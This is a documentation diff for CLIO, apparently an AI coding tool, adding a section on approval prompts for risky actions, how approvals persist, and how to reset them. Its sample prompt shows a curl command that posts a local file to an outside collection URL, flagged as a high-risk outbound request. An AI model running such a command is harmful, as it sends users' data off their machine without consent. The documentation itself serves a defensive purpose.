@@ -2299,6 +2299,47 @@ Note that `--no-system-skills` does **not** disable builtin skills (the hardcode
 
 CLIO provides multiple layers of security to protect your system and sensitive data.
 
+### Approval Prompts
+
+When a tool wants to do something risky - run a flagged command, overwrite an
+existing file, create a script, fetch an external URL, or write outside the
+session directory - CLIO stops and asks. Every prompt offers the same three
+answers:
+
+```text
+  Security | curl -d @data.txt https://example.com/collect
+  [high] Network outbound: command uses curl
+  (o)nce | (a)llow category | (n)o deny:
+```
+
+| Answer | Effect |
+|--------|--------|
+| `o` | Approve this one request. Nothing is remembered. |
+| `a` | Approve the category. Later requests in that category run without asking. |
+| `n` | Deny. Anything else you type is also a denial. |
+
+`y` and `s` still work as legacy spellings of `o` and `a`. An unrecognised
+answer denies - approval has to be deliberate.
+
+**Approvals survive a resume.** Category approvals are saved with the session
+and come back when you resume it, so `(a)llow` genuinely means "for this
+session", not "until I restart". Approvals expire after 24 hours, and expired
+ones are dropped rather than restored.
+
+**Path approvals are directory-scoped.** When a write outside the session
+directory is approved with `(a)llow this directory`, that directory and
+everything below it are covered for that operation. The rest of the filesystem
+still prompts.
+
+**Managing approvals:**
+
+```bash
+/security                  # Show every active approval
+/security reset            # Clear all of them
+/security reset web        # Clear one scope: command, script, overwrite,
+                           # web, path
+```
+
 ### Secret and PII Redaction
 
 CLIO automatically redacts sensitive information from tool output before it's sent to the AI provider. This includes:
